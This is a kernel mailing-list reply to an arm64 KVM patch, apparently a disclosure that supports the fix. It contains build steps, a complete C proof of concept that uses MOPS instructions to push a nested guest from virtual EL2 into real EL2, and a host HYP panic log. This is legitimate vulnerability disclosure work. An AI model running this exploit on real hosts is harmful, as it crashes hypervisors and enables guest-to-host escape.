Received: from mail-pl1-f178.google.com (mail-pl1-f178.google.com [209.85.214.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 95377369211
	for <kvmarm@lists.linux.dev>; Tue, 16 Jun 2026 12:04:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781611446; cv=none; b=MSwozuID9bSw15+mvrdGOxH5a+yS8chz1zMuzreWkCVRQxRr1jymQr/hE4jqOjb10UozHudAQgF9PObNYOx3JvOT4NpM49IZR1qB2rQZ94/UjZT6Qhvi2I5z0ixcI1ze+w68t+NPI8wQXNCJghzoH0FePJljmnPesM5MW5esRZk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781611446; c=relaxed/simple;
	bh=noCtR8PmFWpk7FCqfyiGuXiMeveESUZAgC4BF52rRzc=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=sHaZLxM1+1bKLiajt7vYyP8N0AknkVQ8bOc37L9Zz0dXiAme1vnSiKDbi5ZKBDYj6cZCMyuSozcKvWMQf0BPu+rILo0CFYVrCb1fdwtH6A65uTQ4HwXUL+hXXjXEX5hF28ZciSYCGGmCgZ45RsJ83KTcFzLpvCmo3OyxvYQOJJ8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=r2crWovJ; arc=none smtp.client-ip=209.85.214.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="r2crWovJ"
Received: by mail-pl1-f178.google.com with SMTP id d9443c01a7336-2c0c20f0c0aso31084505ad.0
        for <kvmarm@lists.linux.dev>; Tue, 16 Jun 2026 05:04:04 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1781611444; x=1782216244; darn=lists.linux.dev;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=VN4rcVxHwaMPeVI5r4eND2uMdyXiyGW/cGbEqWQryP0=;
        b=r2crWovJGHdmHoXtLODIu3Gf+LTrDnuxkgH8UpAQL9QV5DbuRFD4jsWY0KE3y14DCu
         aeNtaxuxyCacfPVMNGszCP6r4g/yQILJTvD0pyGrOwJCaNRyOESjN3D0SeTl8moz6hZ7
         gj4ughYL38SbH3sh0nQOfC6N/LVG3nn2cIhtGsNx3EWY0Q6aMIt47EGyUx6YOTTejQtD
         dbn2YcmZcpKLgZRzN6hLzEfrcXaIP4BxFnPqOeZRr2i0lg1VAIIPS2CNqH2WbvunxuQZ
         2pk/1c1A77wPuE3OmEDdwbJTn2+gHybf6KOCSFyCoz3Wx055qFLUJSRe8oEwZIE9gh6l
         aJZQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781611444; x=1782216244;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=VN4rcVxHwaMPeVI5r4eND2uMdyXiyGW/cGbEqWQryP0=;
        b=O1FGyiQoG5RNAOnNTxqHGT1h66Voh+feDMIuxDAuilULNtk2ma49QWCogE/TqJ4f5Q
         sYD/7/7Y7z3+1bIeAa58aMfmX7XvbcceSeiJyhb/tdl9zeCByqTj5EAtuI/lTC8rKN0Z
         ZyzP9zOzfotOw+fOtj0nVQ8NQnYMJQKTBKOK3O/2j31KYZLAv6sofiUw719U4hrabKhQ
         437e9nHb8ezgfCWHAp8sr6Tck6yy2trgImBoo2+UjyGyaNLTTiKuH1LSopt52/Nbfuxp
         zK+eRbxr3Deema7rtQo9338cTRmPzRODvFVETfQzajrWpETsmI7jNPxDRi0j8SYDpRXi
         JzGQ==
X-Forwarded-Encrypted: i=1; AFNElJ8sqLCVNPXDiGITd702fG9X1URkVT4k1Alp615f7yTFxSYmFhWx9OrPeRdhoOR9g6JHj2kSyoY=@lists.linux.dev
X-Gm-Message-State: AOJu0YwBoxbzXATWSn1miXjfUY/opo2NAhUdKe0icHnVW/8Elh2hZBLA
	nGVXKy3RdSYdeBNwq5MXK/AozANP2/YLNahJseG9f/Fu83O7qfZZXoU4
X-Gm-Gg: Acq92OGTNT0QITJ7iCpsoYxmyusz6a8/oPhjGJn3Uky6V1opHOK/uJKk9kOAl8W6UOu
	EuiQ1BgI7tQBkcAogz2QKdjZXwSFolc93yAS/Gef1QQNXVkeqSmOjLxbfoiF0FVSGST57RG1laY
	F6YcEvWsVvMLyXD/zveRf2eL3krN2CbKTLn1nkEi5ihOboiOdiJdY1tQZ6KQWyzZm9NXvOu7z1N
	x2MsDcz/ospSJamvJ+ceiKl1HYr9ZG5J00dTMu7B8vOVCcS/ENHXT1uZwN9M6NBh+3Ejq8DRQBv
	ajj4m0qdjxDRHMyWT40elDLFGGb1k7aOzhy8pTEEmXqMsZQe61TYaax2viy2SB/OZf7XQDmIpiA
	few+LtEOPd4hCJSZl4UeB13MRYjYvOiosKPnWjHTlGADxEyJfvctwHt/f3KzILTAm0YsNTLbcI1
	NFWayz08jsLc5Ji3vU8Yq4qSYqZ8fGjtvDDEiHbkVIY5vfjuLpC5w=
X-Received: by 2002:a17:902:f543:b0:2be:3850:297e with SMTP id d9443c01a7336-2c664216d17mr158438325ad.31.1781611443525;
        Tue, 16 Jun 2026 05:04:03 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2c4328a4c1fsm131590165ad.53.2026.06.16.05.03.58
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 16 Jun 2026 05:04:02 -0700 (PDT)
Date: Tue, 16 Jun 2026 20:03:55 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: Marc Zyngier <maz@kernel.org>, Oliver Upton <oupton@kernel.org>, 
	Catalin Marinas <catalin.marinas@arm.com>, Will Deacon <will@kernel.org>
Cc: Joey Gouly <joey.gouly@arm.com>, Steffen Eiden <seiden@linux.ibm.com>, 
	Suzuki K Poulose <suzuki.poulose@arm.com>, Zenghui Yu <yuzenghui@huawei.com>, 
	Andrew Morton <akpm@linux-foundation.org>, Jakub Kicinski <kuba@kernel.org>, 
	Bjorn Andersson <andersson@kernel.org>, Mark Rutland <mark.rutland@arm.com>, 
	Kristina Martsenko <kristina.martsenko@arm.com>, linux-arm-kernel@lists.infradead.org, kvmarm@lists.linux.dev, 
	Zhong Wang <wangzhong.c0ss4ck@bytedance.com>, Xuanqing Shi <shixuanqing.11@bytedance.com>
Subject: Re: [PATCH] KVM: arm64: nv: Translate vEL2 PSTATE to EL1 in
 kvm_hyp_handle_mops()
Message-ID: <ajE4lHQevXNHpl1M@Air.local>
References: <20260616114943.81188-2-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: kvmarm@lists.linux.dev
List-Id: <kvmarm.lists.linux.dev>
List-Subscribe: <mailto:kvmarm+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:kvmarm+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260616114943.81188-2-bestswngs@gmail.com>



Reproduction Steps:

1. prepare arm64 kernel image

```
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
./scripts/config -e VIRTUALIZATION -e KVM
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc) Image
make ARCH=arm64 headers_install INSTALL_HDR_PATH=/tmp/khdr
```
2. prepare qemu + initramfs

3. boot qemu with the kernel iamge

```
qemu-system-aarch64 \
    -machine virt,virtualization=on,gic-version=3 -cpu max -accel tcg \
    -smp 2 -m 2G -kernel arch/arm64/boot/Image -initrd initramfs.cpio.gz \
    -append "console=ttyAMA0 kvm-arm.mode=nested rdinit=/init panic=-1 oops=panic" \
    -nographic -no-reboot
```

PoC:

```
/*
* PoC: kvm_hyp_handle_mops SPSR_EL2 privilege escalation (EL1 -> EL2)
*
* Demonstrates that kvm_hyp_handle_mops writes un-translated PSR_MODE_EL2h
* into hardware SPSR_EL2 on the fast-reentry path, allowing a nested guest
* to escape to real EL2 after an EC_MOPS trap.
*
* Build:  aarch64-linux-gnu-gcc -static -O0 -o poc_mops poc_mops_clean.c
* Run:    sudo ./poc_mops
*
* Expected result on vulnerable kernel: HYP panic with PS:00000009 (EL2h)
*/


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <linux/kvm.h>


#define KVM_ARM_VCPU_HAS_EL2  7


#define PSR_MODE_EL1h  0x00000005
#define PSR_MODE_EL2h  0x00000009


#define ARM64_CORE_REG(u32_off) (0x6030000000100000ULL | (uint64_t)(u32_off))
#define REG_X(n)    ARM64_CORE_REG((n) * 2)
#define REG_SP      ARM64_CORE_REG(62)
#define REG_PC      ARM64_CORE_REG(64)
#define REG_PSTATE  ARM64_CORE_REG(66)


#define GUEST_MEM_SIZE   (64 * 1024 * 1024)
#define GUEST_CODE_ADDR  0x40000000ULL
#define GUEST_STACK_TOP  (GUEST_CODE_ADDR + GUEST_MEM_SIZE - 0x1000)
#define MMIO_ADDR        0x10000000ULL


static int kvm_set_one_reg(int fd, uint64_t id, uint64_t val)
{
   struct kvm_one_reg r = { .id = id, .addr = (uint64_t)&val };
   return ioctl(fd, KVM_SET_ONE_REG, &r);
}


static int kvm_get_one_reg(int fd, uint64_t id, uint64_t *val)
{
   struct kvm_one_reg r = { .id = id, .addr = (uint64_t)val };
   return ioctl(fd, KVM_GET_ONE_REG, &r);
}


static void die(const char *msg) { perror(msg); exit(1); }


/*
* Guest code (runs at virtual EL2h).
*
* Triggers EC_MOPS by executing CPYP (prologue, large size so it doesn't
* complete in prologue phase) followed immediately by CPYE (epilogue).
* The CPU detects PSTATE.MOPS_STATE mismatch and traps.
*
* kvm_hyp_handle_mops resets PC -= 8 (for epilogue) and writes vcpu_cpsr
* (which contains EL2h after fixup_guest_exit reverse translation) directly
* to HW SPSR_EL2 without forward translation. On eret, the CPU enters
* real EL2h at the guest PC, causing an instruction abort (no EL2 mapping
* for guest addresses) -> HYP panic.
*
* Layout (offsets from GUEST_CODE_ADDR):
*   +0x00  setup x0,x1,x2,x3
*   +0x10  movz x9, #0
*   +0x14  mrs x10, CurrentEL         ; record EL before
*   +0x18  str x10, [x3]              ; MMIO exit #1
*   +0x1C  b +16                      ; jump to cpyp at +0x2C
*   +0x20  nop
*   +0x24  nop
*   +0x28  mrs x11, CurrentEL         ; <-- RESET LANDS HERE (0x30-8)
*   +0x2C  cpyp [x0]!, [x1]!, x2!
*   +0x30  cpye [x0]!, [x1]!, x2!    ; EC_MOPS trap
*   +0x34  str x11, [x3]              ; MMIO exit #2 (after 2nd pass)
*   +0x38  b .                        ; done
*/
static const uint32_t guest_code[] = {
   0xd2a80200,  /* +0x00  movz x0, #0x4010, lsl #16  (dest = 0x40100000) */
   0xd2a80401,  /* +0x04  movz x1, #0x4020, lsl #16  (src  = 0x40200000) */
   0xd2a00202,  /* +0x08  movz x2, #0x10, lsl #16    (size = 1MB) */
   0xd2a20003,  /* +0x0C  movz x3, #0x1000, lsl #16  (MMIO = 0x10000000) */
   0xd2800009,  /* +0x10  movz x9, #0 */
   0xd538424a,  /* +0x14  mrs x10, CurrentEL */
   0xf900006a,  /* +0x18  str x10, [x3] */
   0x14000004,  /* +0x1C  b +16 -> +0x2C */
   0xd503201f,  /* +0x20  nop */
   0xd503201f,  /* +0x24  nop */
   0xd538424b,  /* +0x28  mrs x11, CurrentEL (AFTER eret) */
   0x1d010440,  /* +0x2C  cpyp [x0]!, [x1]!, x2! */
   0x1d810440,  /* +0x30  cpye [x0]!, [x1]!, x2! -> EC_MOPS */
   0xf900006b,  /* +0x34  str x11, [x3] */
   0x14000000,  /* +0x38  b . */
};


int main(void)
{
   int kvm_fd, vm_fd, vcpu_fd, ret;
   struct kvm_vcpu_init vcpu_init = {};
   struct kvm_run *run;
   void *guest_mem;


   setbuf(stdout, NULL);
   setbuf(stderr, NULL);


   printf("[*] kvm_hyp_handle_mops SPSR privilege escalation PoC\n");
   printf("[*] Target: Linux kernel with CONFIG_KVM_ARM_NV + FEAT_MOPS\n\n");


   kvm_fd = open("/dev/kvm", O_RDWR);
   if (kvm_fd < 0) die("open /dev/kvm");


   vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
   if (vm_fd < 0) die("KVM_CREATE_VM");


   /* Guest memory */
   guest_mem = mmap(NULL, GUEST_MEM_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (guest_mem == MAP_FAILED) die("mmap");


   struct kvm_userspace_memory_region region = {
       .slot = 0,
       .guest_phys_addr = GUEST_CODE_ADDR,
       .memory_size = GUEST_MEM_SIZE,
       .userspace_addr = (uint64_t)guest_mem,
   };
   if (ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION, &region) < 0)
       die("KVM_SET_USER_MEMORY_REGION");


   memcpy(guest_mem, guest_code, sizeof(guest_code));


   /* Create vCPU with nested virtualization */
   vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, 0);
   if (vcpu_fd < 0) die("KVM_CREATE_VCPU");


   if (ioctl(vm_fd, KVM_ARM_PREFERRED_TARGET, &vcpu_init) < 0)
       die("KVM_ARM_PREFERRED_TARGET");


   vcpu_init.features[0] |= (1 << KVM_ARM_VCPU_HAS_EL2);
   if (ioctl(vcpu_fd, KVM_ARM_VCPU_INIT, &vcpu_init) < 0) {
       perror("KVM_ARM_VCPU_INIT with HAS_EL2");
       printf("[-] Nested virtualization not supported.\n");
       return 1;
   }
   printf("[+] vCPU created with nested virt (NV)\n");


   /* GICv3 (required before KVM_RUN) */
   {
       struct kvm_create_device gic_dev = { .type = KVM_DEV_TYPE_ARM_VGIC_V3 };
       if (ioctl(vm_fd, KVM_CREATE_DEVICE, &gic_dev) < 0)
           die("KVM_CREATE_DEVICE GICv3");


       uint64_t dist = 0x08000000ULL, redist = 0x080A0000ULL;
       struct kvm_device_attr attr = {
           .group = KVM_DEV_ARM_VGIC_GRP_ADDR,
           .attr = KVM_VGIC_V3_ADDR_TYPE_DIST,
           .addr = (uint64_t)&dist,
       };
       ioctl(gic_dev.fd, KVM_SET_DEVICE_ATTR, &attr);
       attr.attr = KVM_VGIC_V3_ADDR_TYPE_REDIST;
       attr.addr = (uint64_t)&redist;
       ioctl(gic_dev.fd, KVM_SET_DEVICE_ATTR, &attr);


       attr = (struct kvm_device_attr){
           .group = KVM_DEV_ARM_VGIC_GRP_CTRL,
           .attr = KVM_DEV_ARM_VGIC_CTRL_INIT,
       };
       ioctl(gic_dev.fd, KVM_SET_DEVICE_ATTR, &attr);
       printf("[+] GICv3 initialized\n");
   }


   /* Set vCPU state: start at virtual EL2h */
   kvm_set_one_reg(vcpu_fd, REG_PC, GUEST_CODE_ADDR);
   kvm_set_one_reg(vcpu_fd, REG_SP, GUEST_STACK_TOP);
   if (kvm_set_one_reg(vcpu_fd, REG_PSTATE, PSR_MODE_EL2h) < 0) {
       printf("[!] Cannot set EL2h, falling back to EL1h\n");
       kvm_set_one_reg(vcpu_fd, REG_PSTATE, PSR_MODE_EL1h);
   }
   printf("[+] vCPU: PC=0x%llx PSTATE=EL2h SP=0x%llx\n",
          (unsigned long long)GUEST_CODE_ADDR,
          (unsigned long long)GUEST_STACK_TOP);


   /* Map kvm_run */
   int run_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
   run = mmap(NULL, run_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpu_fd, 0);
   if (run == MAP_FAILED) die("mmap vcpu");


   /* Execute guest */
   printf("\n[*] Running guest. If kernel panics -> vulnerability confirmed.\n\n");


   int mmio_count = 0;
   uint64_t el_before = 0, el_after = 0;


   for (int i = 0; i < 100; i++) {
       ret = ioctl(vcpu_fd, KVM_RUN, 0);
       if (ret < 0) {
           printf("[-] KVM_RUN failed: %s (errno=%d)\n", strerror(errno), errno);
           break;
       }


       switch (run->exit_reason) {
       case KVM_EXIT_MMIO:
           if (run->mmio.is_write && run->mmio.phys_addr == MMIO_ADDR) {
               uint64_t val = 0;
               memcpy(&val, run->mmio.data, run->mmio.len);
               mmio_count++;
               printf("[+] MMIO #%d: CurrentEL = 0x%llx (EL%lld)\n",
                      mmio_count, (unsigned long long)val, (long long)(val >> 2) & 3);
               if (mmio_count == 1) el_before = (val >> 2) & 3;
               if (mmio_count == 2) { el_after = (val >> 2) & 3; goto results; }
           }
           break;


       case KVM_EXIT_INTERNAL_ERROR:
           printf("[!] INTERNAL_ERROR: safety assert may have caught EL2h SPSR\n");
           goto done;


       case KVM_EXIT_FAIL_ENTRY:
           printf("[-] FAIL_ENTRY: 0x%llx\n",
                  (unsigned long long)run->fail_entry.hardware_entry_failure_reason);
           goto done;


       default:
           printf("[*] exit_reason=%d (iter %d)\n", run->exit_reason, i);
           break;
       }
   }
   printf("[-] Max iterations reached without result.\n");
   goto done;


results:
   printf("\n========== RESULTS ==========\n");
   printf("  EL before MOPS: EL%lld\n", (long long)el_before);
   printf("  EL after  MOPS: EL%lld\n", (long long)el_after);
   printf("=============================\n\n");


   if (el_after > el_before)
       printf("[!!!] PRIVILEGE ESCALATION: EL%lld -> EL%lld\n",
              (long long)el_before, (long long)el_after);
   else
       printf("[+] No escalation observed in guest registers.\n");


done:
   printf("\n[*] Check dmesg for HYP panic:\n");
   printf("    dmesg | grep -i 'hyp panic\\|PS:.*0009'\n");
   printf("[*] If PS:00000009 appears -> SPSR contained EL2h -> vuln confirmed.\n");


   close(vcpu_fd);
   close(vm_fd);
   close(kvm_fd);
   munmap(guest_mem, GUEST_MEM_SIZE);
   munmap(run, run_size);
   return 0;
}

```

crash log

```
========== FatalMOPS dynamic test (L1 host) ==========
  [*] CPU ID registers (FEAT_MOPS bits[19:16] of isar2; FEAT_NV bits[27:24] of mmfr2):
      /sys/devices/system/cpu/cpu0/regs/identification/id_aa64isar2_el1: (absent)
      /sys/devices/system/cpu/cpu0/regs/identification/id_aa64mmfr2_el1: (absent)
  [+] /dev/kvm present
  [*] dmesg nested-virt lines:
  [*] launching /poc ...
  [*] FatalMOPS PoC: kvm_hyp_handle_mops vEL2->EL2 escape
  [+] vCPU created with nested virt (HAS_EL2)
  [+] GICv3 initialized
  [+] vCPU starts at virtual EL2h
  [*] Running guest. Vulnerable kernel -> HYP panic expected.
  [+] MMIO #1: CurrentEL=EL2
  [    3.326956] Kernel panic - not syncing: HYP panic:
  [    3.326956] PS:00000009 PC:0000000040000028 ESR:86000005
  [    3.326956] FAR:0000000040000028 HPFAR:0000000000402000 PAR:1de7ec7edbadc0de
  [    3.326956] VCPU:000000006f4e5727
  [    3.342728] CPU: 0 UID: 0 PID: 59 Comm: poc Not tainted 7.1.0-rc7-00217-gfbc6a80cb5d3 #1 PREEMPT
  [    3.349460] Hardware name: linux,dummy-virt (DT)
  [    3.353136] Call trace:
  [    3.355241]  show_stack+0x18/0x24 (C)
  [    3.358652]  dump_stack_lvl+0x34/0x8c
  [    3.361515]  dump_stack+0x18/0x24
  [    3.364085]  vpanic+0x47c/0x4dc
  [    3.366527]  do_panic_on_target_cpu+0x0/0x1c
  [    3.369782]  kvm_unexpected_el2_exception+0x0/0x3c0
  [    3.373494]  hyp_panic+0x0/0x80
  [    3.375940]  kvm_arm_vcpu_enter_exit+0x64/0x94
  [    3.379372]  kvm_arch_vcpu_ioctl_run+0x27c/0x8f8
  [    3.382919]  kvm_vcpu_ioctl+0x174/0xa38
  [    3.385894]  __arm64_sys_ioctl+0xac/0x104
  [    3.389105]  invoke_syscall+0x54/0x10c
  [    3.392015]  el0_svc_common.constprop.0+0x40/0xe0
  [    3.395653]  do_el0_svc+0x1c/0x28
  [    3.398236]  el0_svc+0x38/0x11c
  [    3.400681]  el0t_64_sync_handler+0xa0/0xe4
  [    3.403872]  el0t_64_sync+0x198/0x19c
  [    3.407083] SMP: stopping secondary CPUs
  [    3.410661] Kernel Offset: 0x127592c00000 from 0xffff800080000000
  [    3.415585] PHYS_OFFSET: 0x40000000
  [    3.418668] CPU features: 0x00000000,0034e00b,ffeec7e1,9d7e7f3f
  [    3.423170] Memory Limit: none
```

after decode

```
  Kernel panic - not syncing: HYP panic:
  PS:00000009 PC:0000000040000028 ESR:86000005
  FAR:0000000040000028 HPFAR:0000000000402000 PAR:1de7ec7edbadc0de
  VCPU:000000006f4e5727
  CPU: 0 UID: 0 PID: 59 Comm: poc Not tainted 7.1.0-rc7-00217-gfbc6a80cb5d3 #1 PREEMPT
  Call trace:
   show_stack                   (arch/arm64/kernel/stacktrace.c:499)
   dump_stack_lvl               (lib/dump_stack.c:94 120)
   dump_stack                   (lib/dump_stack.c:129)
   vpanic                       (kernel/panic.c:650)
   do_panic_on_target_cpu       (kernel/panic.c:341)
   kvm_unexpected_el2_exception (arch/arm64/kvm/hyp/include/hyp/switch.h:964
                                 → arch/arm64/kvm/hyp/vhe/switch.c:688)
   hyp_panic                    (arch/arm64/kvm/hyp/vhe/switch.c:678)
   kvm_arm_vcpu_enter_exit      (arch/arm64/kvm/arm.c:1227)
   kvm_arch_vcpu_ioctl_run      (arch/arm64/kvm/arm.c:1324)
   kvm_vcpu_ioctl               (virt/kvm/kvm_main.c:4470)
   __arm64_sys_ioctl            (fs/ioctl.c:51 597 583)
   invoke_syscall               (arch/arm64/kernel/syscall.c:35 49)
   el0_svc_common.constprop.0   (arch/arm64/kernel/syscall.c:121)
   do_el0_svc                   (arch/arm64/kernel/syscall.c:140)
   el0_svc                      (arch/arm64/kernel/entry-common.c:740)
   el0t_64_sync_handler         (arch/arm64/kernel/entry-common.c:759)
   el0t_64_sync                 (arch/arm64/kernel/entry.S:594)
```


